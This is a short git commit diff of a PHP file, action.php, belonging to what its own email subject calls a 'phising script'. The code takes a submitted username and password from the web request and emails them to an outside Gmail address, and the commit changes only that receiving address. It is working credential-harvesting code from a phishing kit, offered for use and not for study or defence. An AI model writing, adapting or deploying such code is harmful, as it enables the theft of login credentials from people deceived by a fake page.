2c9ba3c4cf04e8e6663a7d6127feaae125e8ee09
shoronroy <92288837+shoronroy@users.noreply.github.com>
2021-12-16 11:36:59 +0600

    Update action.php

--- action.php
+++ action.php
@@ -8,7 +8,7 @@
 		$username = $_REQUEST['username'];
 		$password = $_REQUEST['password'];
 		
-		$reciever = "hamontaxxx@gmail.com";
+		$reciever = "gachuaadarsha@gmail.com";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
